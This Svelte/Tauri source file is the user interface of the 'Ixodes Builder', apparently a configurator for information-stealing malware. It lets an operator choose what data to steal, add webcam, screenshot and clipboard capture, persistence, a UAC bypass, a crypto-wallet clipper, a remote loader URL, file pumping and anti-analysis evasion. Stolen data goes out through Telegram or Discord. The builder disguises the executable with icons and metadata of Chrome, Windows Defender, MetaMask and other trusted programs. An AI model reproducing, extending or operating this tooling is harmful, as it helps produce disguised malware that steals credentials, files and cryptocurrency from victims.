<script lang="ts">
  import { invoke } from "@tauri-apps/api/core";
  import { open } from "@tauri-apps/plugin-dialog";
  import { Button } from "$lib/components/ui/button";
  import { CardContent, CardHeader } from "$lib/components/ui/card";
  import {
    Select,
    SelectItem,
    SelectContent,
    SelectTrigger,
  } from "$lib/components/ui/select";
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { Separator } from "$lib/components/ui/separator";
  import { brandingPresets } from "$lib/branding-presets";
  import { toast } from "svelte-sonner";
  import CommunicationSection from "./components/CommunicationSection.svelte";
  import FeatureSection from "./components/FeatureSection.svelte";
  import GeoBlockSection from "./components/GeoBlockSection.svelte";
  import PumperSection from "./components/PumperSection.svelte";
  import ClipperSection from "./components/ClipperSection.svelte";
  import LoaderSection from "./components/LoaderSection.svelte";
  import NetworkSection from "./components/NetworkSection.svelte";
  import FileGrabberSection from "./components/FileGrabberSection.svelte";
  import PasswordGeneratorDialog from "./components/PasswordGeneratorDialog.svelte";
  import {
    Dialog,
    DialogContent,
    DialogDescription,
    DialogHeader,
    DialogTitle,
    DialogFooter,
  } from "$lib/components/ui/dialog";
  import * as Collapsible from "$lib/components/ui/collapsible";
  import {
    ChevronRight,
    Hammer,
    KeyRound,
    LockKeyhole,
    WandSparkles,
    Zap,
  } from "@lucide/svelte";
  import { Switch } from "$lib/components/ui/switch";
  import {
    isDiscordWebhookValid,
    isTelegramChatIdValid,
    isTelegramTokenValid,
  } from "$lib/validation/communication";

  type BuildResult = {
    success: boolean;
    output: string;
    exe_path: string | null;
    moved_to: string | null;
  };

  import { builderState } from "$lib/builder-state.svelte";
  import { categories } from "$lib/data/categories";

  const iconPresets = [
    { id: "none", label: "None" },
    { id: "tauri-default", label: "Tauri default" },
    { id: "adobe-acrobat-reader", label: "Adobe Acrobat Reader" },
    { id: "binance", label: "Binance" },
    { id: "brave", label: "Brave" },
    { id: "chrome", label: "Google Chrome" },
    { id: "cs2", label: "CS2" },
    { id: "discord", label: "Discord" },
    { id: "dropbox", label: "Dropbox" },
    { id: "edge", label: "Microsoft Edge" },
    { id: "epicgames", label: "Epic Games Launcher" },
    { id: "firefox", label: "Mozilla Firefox" },
    { id: "google-drive", label: "Google Drive" },
    { id: "java", label: "Java Runtime Environment" },
    { id: "metamask", label: "MetaMask" },
    { id: "nvidia", label: "NVIDIA Control Panel" },
    { id: "onedrive", label: "Microsoft OneDrive" },
    { id: "opera", label: "Opera" },
    { id: "paypal", label: "PayPal" },
    { id: "rs6", label: "Rainbow Six Siege" },
    { id: "steam", label: "Steam" },
    { id: "teams", label: "Microsoft Teams" },
    { id: "telegram", label: "Telegram" },
    { id: "vlc", label: "VLC Media Player" },
    { id: "windows-defender", label: "Windows Defender" },
    { id: "windows", label: "Windows" },
    { id: "word", label: "Microsoft Word" },
    { id: "zoom", label: "Zoom" },
  ] as const;

  const getIconPresetLabel = (presetId: string) =>
    iconPresets.find((preset) => preset.id === presetId)?.label ?? presetId;

  let successTimer: ReturnType<typeof setTimeout> | null = null;

  let lastVerifiedTelegramToken = $state("");
  let lastVerifiedTelegramChatId = $state("");
  let lastVerifiedDiscordWebhook = $state("");

  const telegramTokenValid = $derived(isTelegramTokenValid(builderState.telegramToken));
  const telegramChatIdValid = $derived(isTelegramChatIdValid(builderState.telegramChatId));
  const discordWebhookValid = $derived(isDiscordWebhookValid(builderState.discordWebhook));

  let hasCommunication = $derived(Boolean(builderState.commMode));
  let canBuild = $derived(
    builderState.selectedCategoryCount > 0 &&
      ((builderState.commMode === "telegram" &&
        telegramTokenValid &&
        telegramChatIdValid &&
        builderState.telegramToken.trim().length > 0 &&
        builderState.telegramChatId.trim().length > 0) ||
        (builderState.commMode === "discord" &&
          discordWebhookValid &&
          builderState.discordWebhook.trim().length > 0)),
  );

  $effect(() => {
    if (builderState.iconPreset !== "none" && builderState.iconSource.trim().length > 0) {
      builderState.iconSource = "";
    }
  });

  $effect(() => {
    if (builderState.iconSource.trim().length > 0 && builderState.iconPreset !== "none") {
      builderState.iconPreset = "none";
    }
  });

  const showToast = (
    message: string,
    title = "Notice",
    type: "info" | "error" = "info",
  ) => {
    if (type === "error") {
      toast.error(title, { description: message });
    } else {
      toast.message(title, { description: message });
    }
  };

  const toggleCategory = (id: string, checked: boolean) => {
    if (!checked && builderState.selectedCategories.length <= 1 && builderState.categoryState[id]) {
      showToast("At least one category must stay enabled.");
      return;
    }
    builderState.categoryState = { ...builderState.categoryState, [id]: checked };
  };

  const toggleScreenshots = () => {
    builderState.captureScreenshots = !builderState.captureScreenshots;
  };

  const toggleWebcams = () => {
    builderState.captureWebcams = !builderState.captureWebcams;
  };

  const toggleClipboard = () => {
    builderState.captureClipboard = !builderState.captureClipboard;
  };

  const togglePersistence = () => {
    builderState.persistence = !builderState.persistence;
  };

  const toggleUacBypass = () => {
    builderState.uacBypass = !builderState.uacBypass;
  };

  const toggleEvasion = () => {
    if (builderState.evasion) {
      builderState.showEvasionWarning = true;
    } else {
      builderState.evasion = true;
    }
  };

  const toggleStandalone = () => {
    builderState.standalone = !builderState.standalone;
  };

  const toggleClipper = () => {
    builderState.clipper = !builderState.clipper;
  };

  const toggleMelt = () => {
    builderState.melt = !builderState.melt;
  };

  const handleBtcChange = (val: string) => (builderState.btcAddress = val);
  const handleEthChange = (val: string) => (builderState.ethAddress = val);
  const handleLtcChange = (val: string) => (builderState.ltcAddress = val);
  const handleXmrChange = (val: string) => (builderState.xmrAddress = val);
  const handleDogeChange = (val: string) => (builderState.dogeAddress = val);
  const handleDashChange = (val: string) => (builderState.dashAddress = val);
  const handleSolChange = (val: string) => (builderState.solAddress = val);
  const handleTrxChange = (val: string) => (builderState.trxAddress = val);
  const handleAdaChange = (val: string) => (builderState.adaAddress = val);
  const handleLoaderUrlChange = (val: string) => (builderState.loaderUrl = val);
  const handleProxyServerChange = (val: string) => (builderState.proxyServer = val);

  const toggleCountry = (code: string) => {
    if (builderState.blockedCountries.includes(code)) {
      builderState.blockedCountries = builderState.blockedCountries.filter((c) => c !== code);
    } else {
      builderState.blockedCountries = [...builderState.blockedCountries, code];
    }
  };

  const setBlockedCountries = (codes: string[]) => {
    builderState.blockedCountries = codes;
  };

  const setPumpSize = (size: number) => {
    builderState.pumpSize = size;
  };

  const setPumpUnit = (unit: "kb" | "mb" | "gb") => {
    builderState.pumpUnit = unit;
  };

  const addExtension = (ext: string) => {
    if (!builderState.customExtensions.includes(ext)) {
      builderState.customExtensions = [...builderState.customExtensions, ext];
    }
  };

  const removeExtension = (ext: string) => {
    builderState.customExtensions = builderState.customExtensions.filter((e) => e !== ext);
  };

  const addKeyword = (kw: string) => {
    if (!builderState.customKeywords.includes(kw)) {
      builderState.customKeywords = [...builderState.customKeywords, kw];
    }
  };

  const removeKeyword = (kw: string) => {
    builderState.customKeywords = builderState.customKeywords.filter((k) => k !== kw);
  };

  const generatePassword = () => {
    const lower = "abcdefghijklmnopqrstuvwxyz";
    const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const nums = "0123456789";
    const syms = "!@#$%^&*()_+-=[]{}|;:,.<>?";

    let charset = lower;
    if (builderState.pwdUppercase) charset += upper;
    if (builderState.pwdNumbers) charset += nums;
    if (builderState.pwdSymbols) charset += syms;

    let result = "";
    const array = new Uint32Array(builderState.pwdLength);
    crypto.getRandomValues(array);
    for (let i = 0; i < builderState.pwdLength; i++) {
      result += charset[array[i] % charset.length];
    }
    builderState.archivePassword = result;
  };

  const setPwdLength = (val: number) => (builderState.pwdLength = val);
  const togglePwdUppercase = () => (builderState.pwdUppercase = !builderState.pwdUppercase);
  const togglePwdNumbers = () => (builderState.pwdNumbers = !builderState.pwdNumbers);
  const togglePwdSymbols = () => (builderState.pwdSymbols = !builderState.pwdSymbols);

  const setCommunicationMode = (mode: "telegram" | "discord") => {
    builderState.commMode = mode;
  };

  const handleTelegramTokenChange = (value: string) => {
    builderState.telegramToken = value;
  };

  const handleTelegramChatIdChange = (value: string) => {
    builderState.telegramChatId = value;
  };

  const handleDiscordWebhookChange = (value: string) => {
    builderState.discordWebhook = value;
  };

  const generateArtifactKey = () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    let binary = "";
    for (const byte of bytes) {
      binary += String.fromCharCode(byte);
    }
    return btoa(binary);
  };

  const chooseOutputDir = async () => {
    const result = await open({
      directory: true,
      multiple: false,
      title: "Select output folder",
    });
    if (!result) return;
    if (Array.isArray(result)) {
      builderState.outputDir = result[0] ?? "";
    } else {
      builderState.outputDir = result;
    }
  };

  const chooseIconFile = async () => {
    const result = await open({
      directory: false,
      multiple: false,
      title: "Select icon file",
      filters: [{ name: "Icons", extensions: ["ico", "icns", "png"] }],
    });
    if (!result) return;
    if (Array.isArray(result)) {
      builderState.iconSource = result[0] ?? "";
    } else {
      builderState.iconSource = result;
    }
  };

  const runBuild = async () => {
    if (!canBuild) {
      const message = "Please fix validation errors before building.";
      builderState.buildStatus = "error";
      builderState.buildError = message;
      showToast(message, "Validation failed", "error");
      return;
    }

    let pumpSizeMb = 0;
    if (builderState.pumpSize > 0) {
      if (builderState.pumpUnit === "kb") pumpSizeMb = Math.ceil(builderState.pumpSize / 1024);
      else if (builderState.pumpUnit === "mb") pumpSizeMb = builderState.pumpSize;
      else if (builderState.pumpUnit === "gb") pumpSizeMb = builderState.pumpSize * 1024;
    }

    builderState.buildStatus = "loading";
    builderState.buildError = "";
    builderState.movedTo = "";
    if (successTimer) {
      clearTimeout(successTimer);
      successTimer = null;
    }

    try {
      const isNewTelegram =
        builderState.commMode === "telegram" &&
        (builderState.telegramToken !== lastVerifiedTelegramToken ||
          builderState.telegramChatId !== lastVerifiedTelegramChatId);
      const isNewDiscord =
        builderState.commMode === "discord" && builderState.discordWebhook !== lastVerifiedDiscordWebhook;

      if (isNewTelegram || isNewDiscord) {
        showToast(
          "Verifying communication settings...",
          "Testing Connection",
          "info",
        );
        if (builderState.commMode === "telegram") {
          await invoke("test_telegram_connection", {
            token: builderState.telegramToken,
            chatId: builderState.telegramChatId,
          });
          lastVerifiedTelegramToken = builderState.telegramToken;
          lastVerifiedTelegramChatId = builderState.telegramChatId;
        } else {
          await invoke("test_discord_connection", { webhook: builderState.discordWebhook });
          lastVerifiedDiscordWebhook = builderState.discordWebhook;
        }
        showToast("Connection verification successful!", "Success", "info");
      }
    } catch (error) {
      builderState.buildStatus = "error";
      builderState.buildError = `Connection test failed: ${String(error)}`;
      showToast(builderState.buildError, "Connection Test Failed", "error");
      return;
    }

    try {
      const result = (await invoke("build_ixodes", {
        request: {
          settings: {
            allowed_categories: builderState.selectedCategories,
            artifact_key: builderState.encryptArtifacts ? generateArtifactKey() : null,
            archive_password: builderState.archivePassword,
            telegram_token: builderState.telegramToken,
            telegram_chat_id: builderState.telegramChatId,
            discord_webhook: builderState.discordWebhook,
            capture_screenshots: builderState.captureScreenshots,
            capture_webcams: builderState.captureWebcams,
            capture_clipboard: builderState.captureClipboard,
            persistence: builderState.persistence,
            uac_bypass: builderState.uac_bypass,
            evasion: builderState.evasion,
            clipper: builderState.clipper,
            standalone: builderState.standalone,
            melt: builderState.melt,
            loader_url: builderState.loaderUrl,
            proxy_server: builderState.proxyServer,
            btc_address: builderState.btcAddress,
            eth_address: builderState.ethAddress,
            ltc_address: builderState.ltcAddress,
            xmr_address: builderState.xmrAddress,
            doge_address: builderState.doge_address,
            dash_address: builderState.dashAddress,
            sol_address: builderState.solAddress,
            trx_address: builderState.trxAddress,
            ada_address: builderState.adaAddress,
            blocked_countries: builderState.blockedCountries,
            pump_size_mb: pumpSizeMb,
            custom_extensions: builderState.customExtensions,
            custom_keywords: builderState.customKeywords,
            debug: builderState.debug,
          },
          branding: {
            icon_source: builderState.iconSource,
            icon_preset: builderState.iconPreset,
            product_name: builderState.productName,
            file_description: builderState.fileDescription,
            company_name: builderState.companyName,
            product_version: builderState.productVersion,
            file_version: builderState.fileVersion,
            copyright: builderState.copyright,
          },
          output_dir: builderState.outputDir,
        },
      })) as BuildResult;
      builderState.movedTo = result.moved_to ?? "";
      builderState.buildStatus = result.success ? "success" : "error";
      if (!result.success) {
        const errorDetails = result.output
          ? result.output.trim()
          : "No output captured";
        const shortError =
          errorDetails.length > 200
            ? errorDetails.substring(0, 200) + "..."
            : errorDetails;

        builderState.buildError = `Build failed: ${errorDetails}`;
        showToast(shortError, "Build failed", "error");
      } else {
        successTimer = setTimeout(() => {
          builderState.buildStatus = "idle";
          successTimer = null;
        }, 5000);
      }
    } catch (error) {
      builderState.buildStatus = "error";
      builderState.buildError = String(error);
      showToast(builderState.buildError, "Build failed", "error");
    }
  };

  const generateBranding = () => {
    const preset =
      brandingPresets[Math.floor(Math.random() * brandingPresets.length)];
    builderState.productName = preset.productName;
    builderState.fileDescription = preset.fileDescription;
    builderState.companyName = preset.companyName;
    builderState.productVersion = preset.productVersion;
    builderState.fileVersion = preset.fileVersion;
    builderState.copyright = preset.copyright;
    builderState.iconSource = "";
    builderState.iconPreset = preset.iconPreset;
  };
</script>

<main
  class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 pt-6 pb-4"
>
  <CardHeader class="space-y-4 border-b border-border/60">
    <div class="flex items-center justify-between gap-4">
      <div
        class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground"
      >
        Ixodes Builder
      </div>
    </div>
  </CardHeader>
  <CardContent class="space-y-10">
    <FeatureSection
      {categories}
      categoryState={builderState.categoryState}
      selectedCategoryCount={builderState.selectedCategoryCount}
      toggleCategory={toggleCategory}
      {showToast}
      captureScreenshots={builderState.captureScreenshots}
      captureWebcams={builderState.captureWebcams}
      captureClipboard={builderState.captureClipboard}
      persistence={builderState.persistence}
      uacBypass={builderState.uacBypass}
      evasion={builderState.evasion}
      clipper={builderState.clipper}
      melt={builderState.melt}
      onToggleScreenshots={toggleScreenshots}
      onToggleWebcams={toggleWebcams}
      onToggleClipboard={toggleClipboard}
      onTogglePersistence={togglePersistence}
      onToggleUacBypass={toggleUacBypass}
      onToggleEvasion={toggleEvasion}
      onToggleClipper={toggleClipper}
      onToggleMelt={toggleMelt}
    />

    {#if builderState.clipper}
      <ClipperSection
        btcAddress={builderState.btcAddress}
        ethAddress={builderState.ethAddress}
        ltcAddress={builderState.ltcAddress}
        xmrAddress={builderState.xmrAddress}
        dogeAddress={builderState.dogeAddress}
        dashAddress={builderState.dashAddress}
        solAddress={builderState.solAddress}
        trxAddress={builderState.trxAddress}
        adaAddress={builderState.adaAddress}
        onBtcChange={handleBtcChange}
        onEthChange={handleEthChange}
        onLtcChange={handleLtcChange}
        onXmrChange={handleXmrChange}
        onDogeChange={handleDogeChange}
        onDashChange={handleDashChange}
        onSolChange={handleSolChange}
        onTrxChange={handleTrxChange}
        onAdaChange={handleAdaChange}
      />
    {/if}

    <CommunicationSection
      commMode={builderState.commMode}
      setCommMode={setCommunicationMode}
      telegramToken={builderState.telegramToken}
      telegramChatId={builderState.telegramChatId}
      discordWebhook={builderState.discordWebhook}
      onTelegramTokenChange={handleTelegramTokenChange}
      onTelegramChatIdChange={handleTelegramChatIdChange}
      onDiscordWebhookChange={handleDiscordWebhookChange}
    />

    <div class="space-y-3">
      <div
        class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground"
      >
        <LockKeyhole class="h-4 w-4 text-primary" />
        Archive Password
      </div>
      <div class="flex gap-2">
        <Input
          id="archive-password"
          placeholder="Archive password (optional)"
          type="password"
          bind:value={builderState.archivePassword}
        />
        <PasswordGeneratorDialog
          length={builderState.pwdLength}
          useUppercase={builderState.pwdUppercase}
          useNumbers={builderState.pwdNumbers}
          useSymbols={builderState.pwdSymbols}
          onLengthChange={setPwdLength}
          onToggleUppercase={togglePwdUppercase}
          onToggleNumbers={togglePwdNumbers}
          onToggleSymbols={togglePwdSymbols}
        />
        <Button variant="outline" onclick={generatePassword}>
          <WandSparkles class="mr-2 h-4 w-4" />
          Generate
        </Button>
      </div>
      <div class="flex items-center space-x-2 pt-1">
        <Switch
          id="encrypt-artifacts"
          checked={builderState.encryptArtifacts}
          onCheckedChange={(checked) => (builderState.encryptArtifacts = checked)}
        />
        <Label for="encrypt-artifacts" class="text-xs text-muted-foreground">
          Encrypt individual files (Paranoid mode)
        </Label>
      </div>
    </div>

    <div class="grid gap-10 md:grid-cols-2">
      <GeoBlockSection
        blockedCountries={builderState.blockedCountries}
        onToggleCountry={toggleCountry}
        onSetCountries={setBlockedCountries}
      />

      <PumperSection
        pumpSize={builderState.pumpSize}
        pumpUnit={builderState.pumpUnit}
        onPumpSizeChange={setPumpSize}
        onPumpUnitChange={setPumpUnit}
      />
    </div>

    <LoaderSection loaderUrl={builderState.loaderUrl} onLoaderUrlChange={handleLoaderUrlChange} />

    <NetworkSection
      proxyServer={builderState.proxyServer}
      onProxyServerChange={handleProxyServerChange}
    />

    <FileGrabberSection
      customExtensions={builderState.customExtensions}
      customKeywords={builderState.customKeywords}
      onAddExtension={addExtension}
      onRemoveExtension={removeExtension}
      onAddKeyword={addKeyword}
      onRemoveKeyword={removeKeyword}
    />

    <Collapsible.Root bind:open={builderState.isOpenBranding} class="space-y-4">
      <Collapsible.Trigger
        class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground hover:text-foreground transition-colors outline-none group"
      >
        <KeyRound class="h-4 w-4 text-primary" />
        <span>Executable branding</span>
        <ChevronRight
          class="h-4 w-4 transition-transform duration-200 {builderState.isOpenBranding
            ? 'rotate-90'
            : ''}"
        />
      </Collapsible.Trigger>

      <Collapsible.Content class="space-y-4 pt-2">
        <div class="flex flex-wrap items-center justify-between gap-3">
          <p class="text-xs text-muted-foreground">
            Windows embeds icon and version metadata into the executable.
            macOS/Linux apply only when packaging an app bundle. Preset icons
            are embedded in the builder. Icons must be square and between
            256x256 and 512x512.
          </p>
          <Button variant="outline" size="sm" onclick={generateBranding}>
            Generate Random
          </Button>
        </div>
        <div class="grid gap-4 md:grid-cols-2">
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="product-name">
              Product name
            </Label>
            <Input
              id="product-name"
              placeholder="Ixodes"
              bind:value={builderState.productName}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="file-description">
              File description
            </Label>
            <Input
              id="file-description"
              placeholder="Recovery toolkit"
              bind:value={builderState.fileDescription}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="company-name">
              Company name
            </Label>
            <Input
              id="company-name"
              placeholder="Acme Labs"
              bind:value={builderState.companyName}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="product-version">
              Product version
            </Label>
            <Input
              id="product-version"
              placeholder="1.0.0.0"
              bind:value={builderState.productVersion}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="file-version">
              File version
            </Label>
            <Input
              id="file-version"
              placeholder="1.0.0.0"
              bind:value={builderState.fileVersion}
            />
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="copyright">
              Copyright
            </Label>
            <Input
              id="copyright"
              placeholder="© 2026 Example Co."
              bind:value={builderState.copyright}
            />
          </div>
        </div>
        <div
          class="grid w-full items-start gap-3 md:grid-cols-[minmax(180px,0.35fr)_minmax(0,1fr)]"
        >
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground" for="icon-preset">
              Preset icon
            </Label>
            <Select
              type="single"
              bind:value={builderState.iconPreset}
              disabled={builderState.iconSource.trim().length > 0}
            >
              <SelectTrigger id="icon-preset" class="w-full">
                <span>{getIconPresetLabel(builderState.iconPreset)}</span>
              </SelectTrigger>
              <SelectContent>
                {#each iconPresets as preset (preset.id)}
                  <SelectItem value={preset.id}>{preset.label}</SelectItem>
                {/each}
              </SelectContent>
            </Select>
          </div>
          <div class="space-y-2">
            <Label class="text-xs text-muted-foreground">Custom icon</Label>
            <div class="grid gap-3 md:grid-cols-[1fr_auto]">
              <Input
                placeholder="Icon URL, file path, or directory"
                bind:value={builderState.iconSource}
                disabled={builderState.iconPreset !== "none"}
              />
              <Button
                variant="outline"
                onclick={chooseIconFile}
                disabled={builderState.iconPreset !== "none"}
              >
                Choose icon
              </Button>
            </div>
          </div>
        </div>
      </Collapsible.Content>
    </Collapsible.Root>

    <Separator />

    <div class="flex items-center space-x-2">
      <Switch
        id="standalone-build"
        checked={builderState.standalone}
        onCheckedChange={toggleStandalone}
      />
      <Label for="standalone-build" class="flex items-center gap-2">
        <Zap class="h-4 w-4 text-amber-500" />
        Standalone Build
        <span class="text-xs text-muted-foreground font-normal">
          (Removes dependency on vcruntime140.dll by statically linking the C
          runtime. Increases exe size.)
        </span>
      </Label>
    </div>

    <div class="flex items-center space-x-2">
      <Switch
        id="debug-mode"
        checked={builderState.debug}
        onCheckedChange={() => (builderState.debug = !builderState.debug)}
      />
      <Label for="debug-mode" class="flex items-center gap-2">
        <Hammer class="h-4 w-4 text-blue-500" />
        Debug Mode
        <span class="text-xs text-muted-foreground font-normal">
          (Keeps terminal open, creates desktop log, and disables melt feature.)
        </span>
      </Label>
    </div>

    <div
      class="sticky bottom-4 z-40 -mx-4 rounded-lg border border-border/70 bg-background/95 px-4 py-4 shadow-lg backdrop-blur"
    >
      <div class="flex flex-wrap items-center justify-between gap-4">
        <Button
          size="lg"
          class={`gap-2 transition-colors ${builderState.buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
          onclick={runBuild}
          disabled={builderState.buildStatus === "loading" || !canBuild}
        >
          <Hammer class="h-4 w-4" />
          {builderState.buildStatus === "loading"
            ? "Building..."
            : builderState.buildStatus === "success"
              ? "Success"
              : "Build release"}
        </Button>
        <div class="text-xs text-muted-foreground">
          <div class="flex items-center gap-2">
            <span
              class={hasCommunication ? "text-emerald-500" : "text-destructive"}
            >
              {hasCommunication
                ? "Communication set"
                : "Select Telegram or Discord"}
            </span>
            <span class="text-muted-foreground">•</span>
            <span
              class={builderState.selectedCategoryCount > 0
                ? "text-emerald-500"
                : "text-destructive"}
            >
              {builderState.selectedCategoryCount > 0
                ? `${builderState.selectedCategoryCount} categories`
                : "Pick a category"}
            </span>
          </div>
        </div>
        <div class="grid gap-3 md:grid-cols-[1fr_auto]">
          <Input placeholder="Defaults to Desktop" bind:value={builderState.outputDir} />
          <Button variant="outline" onclick={chooseOutputDir}>
            Choose folder
          </Button>
        </div>
      </div>
    </div>
  </CardContent>
</main>

<Dialog bind:open={builderState.showEvasionWarning}>
  <DialogContent>
    <DialogHeader>
      <DialogTitle>Warning: Disabling Evasion</DialogTitle>
      <DialogDescription class="space-y-4">
        <p>
          Disabling <strong>Evasion & Anti-VM</strong> will significantly
          increase detection rates on analysis platforms like
          <strong>VirusTotal, Any.Run, Triage, Joe Sandbox</strong>, etc.
        </p>
        <p>
          Analysis environments will be able to easily identify the agent's
          behavior, leading to faster blacklisting of your build.
        </p>
        <p class="text-xs text-muted-foreground">
          Only disable this if you intend to run the agent in your own
          controlled virtual environment for debugging or testing.
        </p>
      </DialogDescription>
    </DialogHeader>
    <DialogFooter class="flex justify-end gap-3 mt-4">
      <Button variant="outline" onclick={() => (builderState.showEvasionWarning = false)}
        >Cancel</Button
      >
      <Button
        variant="destructive"
        onclick={() => {
          builderState.evasion = false;
          builderState.showEvasionWarning = false;
        }}>Disable anyway</Button
      >
    </DialogFooter>
  </DialogContent>
</Dialog>
